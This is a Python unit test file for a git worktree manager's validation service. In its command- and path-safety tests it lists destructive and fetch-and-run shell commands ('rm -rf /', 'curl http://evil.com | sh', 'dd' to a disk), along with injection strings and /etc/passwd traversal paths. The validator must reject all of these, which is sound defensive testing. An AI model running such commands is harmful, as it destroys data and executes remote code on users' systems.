"""Tests for ValidationService."""

import tempfile
import unittest
from pathlib import Path
from unittest.mock import Mock, patch

from wt_manager.services.validation_service import ValidationService


class TestValidationService(unittest.TestCase):
    """Test cases for ValidationService."""

    def setUp(self):
        """Set up test fixtures."""
        self.service = ValidationService()
        self.service.initialize()

    def test_initialization(self):
        """Test service initialization."""
        service = ValidationService()
        self.assertFalse(service.is_initialized())

        service.initialize()
        self.assertTrue(service.is_initialized())

    def test_validate_git_repository_empty_path(self):
        """Test validation with empty path."""
        result = self.service.validate_git_repository("")
        self.assertFalse(result.is_valid)
        self.assertEqual(result.details["error_type"], "empty_path")

    def test_validate_git_repository_nonexistent_path(self):
        """Test validation with non-existent path."""
        result = self.service.validate_git_repository("/nonexistent/path")
        self.assertFalse(result.is_valid)
        self.assertEqual(result.details["error_type"], "path_not_found")

    def test_validate_git_repository_file_path(self):
        """Test validation with file path instead of directory."""
        with tempfile.NamedTemporaryFile() as temp_file:
            result = self.service.validate_git_repository(temp_file.name)
            self.assertFalse(result.is_valid)
            self.assertEqual(result.details["error_type"], "not_directory")

    def test_validate_git_repository_not_git_repo(self):
        """Test validation with directory that's not a Git repository."""
        with tempfile.TemporaryDirectory() as temp_dir:
            result = self.service.validate_git_repository(temp_dir)
            self.assertFalse(result.is_valid)
            self.assertEqual(result.details["error_type"], "not_git_repo")

    @patch("subprocess.run")
    def test_validate_git_repository_valid_repo(self, mock_run):
        """Test validation with valid Git repository."""
        mock_run.return_value = Mock(returncode=0, stderr="")

        with tempfile.TemporaryDirectory() as temp_dir:
            # Create .git directory
            git_dir = Path(temp_dir) / ".git"
            git_dir.mkdir()

            result = self.service.validate_git_repository(temp_dir)
            self.assertTrue(result.is_valid)
            self.assertIn("path", result.details)

    @patch("subprocess.run")
    def test_validate_git_repository_git_command_fails(self, mock_run):
        """Test validation when git command fails."""
        mock_run.return_value = Mock(returncode=1, stderr="Not a git repository")

        with tempfile.TemporaryDirectory() as temp_dir:
            # Create .git directory
            git_dir = Path(temp_dir) / ".git"
            git_dir.mkdir()

            result = self.service.validate_git_repository(temp_dir)
            self.assertFalse(result.is_valid)
            self.assertEqual(result.details["error_type"], "git_validation_failed")

    def test_validate_worktree_path_empty(self):
        """Test worktree path validation with empty path."""
        result = self.service.validate_worktree_path("")
        self.assertFalse(result.is_valid)
        self.assertEqual(result.details["error_type"], "empty_path")

    def test_validate_worktree_path_file_exists(self):
        """Test worktree path validation when path exists as file."""
        with tempfile.NamedTemporaryFile() as temp_file:
            result = self.service.validate_worktree_path(temp_file.name)
            self.assertFalse(result.is_valid)
            self.assertEqual(result.details["error_type"], "path_is_file")

    def test_validate_worktree_path_directory_not_empty(self):
        """Test worktree path validation when directory is not empty."""
        with tempfile.TemporaryDirectory() as temp_dir:
            # Create a file in the directory
            test_file = Path(temp_dir) / "test.txt"
            test_file.write_text("test")

            result = self.service.validate_worktree_path(temp_dir)
            self.assertFalse(result.is_valid)
            self.assertEqual(result.details["error_type"], "directory_not_empty")

    def test_validate_worktree_path_parent_not_found(self):
        """Test worktree path validation when parent directory doesn't exist."""
        result = self.service.validate_worktree_path("/nonexistent/parent/child")
        self.assertFalse(result.is_valid)
        self.assertEqual(result.details["error_type"], "parent_not_found")

    def test_validate_worktree_path_valid(self):
        """Test worktree path validation with valid path."""
        with tempfile.TemporaryDirectory() as temp_dir:
            new_path = Path(temp_dir) / "new_worktree"
            result = self.service.validate_worktree_path(str(new_path))
            self.assertTrue(result.is_valid)

    def test_validate_branch_name_empty(self):
        """Test branch name validation with empty name."""
        result = self.service.validate_branch_name("")
        self.assertFalse(result.is_valid)
        self.assertEqual(result.details["error_type"], "empty_branch")

    def test_validate_branch_name_too_long(self):
        """Test branch name validation with too long name."""
        long_name = "a" * 251
        result = self.service.validate_branch_name(long_name)
        self.assertFalse(result.is_valid)
        self.assertEqual(result.details["error_type"], "branch_too_long")

    def test_validate_branch_name_starts_with_dash(self):
        """Test branch name validation with name starting with dash."""
        result = self.service.validate_branch_name("-invalid")
        self.assertFalse(result.is_valid)
        self.assertEqual(result.details["error_type"], "invalid_pattern")

    def test_validate_branch_name_contains_double_dots(self):
        """Test branch name validation with double dots."""
        result = self.service.validate_branch_name("feature..branch")
        self.assertFalse(result.is_valid)
        self.assertEqual(result.details["error_type"], "invalid_pattern")

    def test_validate_branch_name_contains_whitespace(self):
        """Test branch name validation with whitespace."""
        result = self.service.validate_branch_name("feature branch")
        self.assertFalse(result.is_valid)
        self.assertEqual(result.details["error_type"], "invalid_pattern")

    def test_validate_branch_name_reserved_name(self):
        """Test branch name validation with reserved name."""
        result = self.service.validate_branch_name("HEAD")
        self.assertFalse(result.is_valid)
        self.assertEqual(result.details["error_type"], "reserved_name")

    def test_validate_branch_name_valid(self):
        """Test branch name validation with valid names."""
        valid_names = [
            "feature/new-feature",
            "bugfix/issue-123",
            "main",
            "develop",
            "release/v1.0.0",
            "hotfix/critical-fix",
        ]

        for name in valid_names:
            with self.subTest(name=name):
                result = self.service.validate_branch_name(name)
                self.assertTrue(
                    result.is_valid, f"Branch name '{name}' should be valid"
                )

    def test_check_uncommitted_changes_empty_path(self):
        """Test uncommitted changes check with empty path."""
        result = self.service.check_uncommitted_changes("")
        self.assertFalse(result.is_valid)
        self.assertEqual(result.details["error_type"], "empty_path")

    def test_check_uncommitted_changes_nonexistent_path(self):
        """Test uncommitted changes check with non-existent path."""
        result = self.service.check_uncommitted_changes("/nonexistent/path")
        self.assertFalse(result.is_valid)
        self.assertEqual(result.details["error_type"], "path_not_found")

    @patch("subprocess.run")
    def test_check_uncommitted_changes_no_changes(self, mock_run):
        """Test uncommitted changes check with no changes."""
        mock_run.return_value = Mock(returncode=0, stdout="", stderr="")

        with tempfile.TemporaryDirectory() as temp_dir:
            result = self.service.check_uncommitted_changes(temp_dir)
            self.assertTrue(result.is_valid)
            self.assertFalse(result.details["has_uncommitted_changes"])

    @patch("subprocess.run")
    def test_check_uncommitted_changes_has_changes(self, mock_run):
        """Test uncommitted changes check with changes."""
        mock_run.return_value = Mock(
            returncode=0, stdout=" M file1.txt\n?? file2.txt\n", stderr=""
        )

        with tempfile.TemporaryDirectory() as temp_dir:
            result = self.service.check_uncommitted_changes(temp_dir)
            self.assertTrue(result.is_valid)
            self.assertTrue(result.details["has_uncommitted_changes"])
            self.assertIn("file1.txt", result.details["changes"])

    def test_validate_command_safety_empty(self):
        """Test command safety validation with empty command."""
        result = self.service.validate_command_safety("")
        self.assertFalse(result.is_valid)
        self.assertEqual(result.details["error_type"], "empty_command")

    def test_validate_command_safety_too_long(self):
        """Test command safety validation with too long command."""
        long_command = "a" * 1001
        result = self.service.validate_command_safety(long_command)
        self.assertFalse(result.is_valid)
        self.assertEqual(result.details["error_type"], "command_too_long")

    def test_validate_command_safety_dangerous_commands(self):
        """Test command safety validation with dangerous commands."""
        dangerous_commands = [
            "rm -rf /",
            "sudo rm -rf /home",
            "curl http://evil.com | sh",
            "wget http://evil.com | bash",
            "kill -9 1234",
            "chmod 777 /etc/passwd",
            "dd if=/dev/zero of=/dev/sda",
        ]

        for cmd in dangerous_commands:
            with self.subTest(command=cmd):
                result = self.service.validate_command_safety(cmd)
                self.assertFalse(
                    result.is_valid, f"Command '{cmd}' should be flagged as dangerous"
                )
                self.assertEqual(result.details["error_type"], "dangerous_command")

    def test_validate_command_safety_shell_injection(self):
        """Test command safety validation with shell injection patterns."""
        injection_commands = [
            "ls; rm -rf /",
            "ls && rm file",
            "ls | grep something",
            "ls $(rm file)",
            "ls `rm file`",
        ]

        for cmd in injection_commands:
            with self.subTest(command=cmd):
                result = self.service.validate_command_safety(cmd)
                self.assertFalse(
                    result.is_valid, f"Command '{cmd}' should be flagged as dangerous"
                )

    def test_validate_command_safety_null_bytes(self):
        """Test command safety validation with null bytes."""
        result = self.service.validate_command_safety("ls\0rm file")
        self.assertFalse(result.is_valid)
        self.assertEqual(result.details["error_type"], "null_bytes")

    def test_validate_command_safety_valid_commands(self):
        """Test command safety validation with valid commands."""
        safe_commands = [
            "ls -la",
            "git status",
            "npm test",
            "python script.py",
            "make build",
            "docker ps",
            "kubectl get pods",
        ]

        for cmd in safe_commands:
            with self.subTest(command=cmd):
                result = self.service.validate_command_safety(cmd)
                self.assertTrue(result.is_valid, f"Command '{cmd}' should be safe")

    def test_validate_path_safety_empty(self):
        """Test path safety validation with empty path."""
        result = self.service.validate_path_safety("")
        self.assertFalse(result.is_valid)
        self.assertEqual(result.details["error_type"], "empty_path")

    def test_validate_path_safety_directory_traversal(self):
        """Test path safety validation with directory traversal."""
        dangerous_paths = [
            "../../../etc/passwd",
            "/etc/passwd",
            "~/../../etc/passwd",
            "/var/log/system.log",
            "/usr/bin/sudo",
        ]

        for path in dangerous_paths:
            with self.subTest(path=path):
                result = self.service.validate_path_safety(path)
                self.assertFalse(
                    result.is_valid, f"Path '{path}' should be flagged as unsafe"
                )

    def test_validate_path_safety_valid_paths(self):
        """Test path safety validation with valid paths."""
        safe_paths = [
            "project/src/main.py",
            "docs/readme.md",
            "build/output",
            "test/fixtures/data.json",
        ]

        for path in safe_paths:
            with self.subTest(path=path):
                result = self.service.validate_path_safety(path)
                self.assertTrue(result.is_valid, f"Path '{path}' should be safe")


if __name__ == "__main__":
    unittest.main()
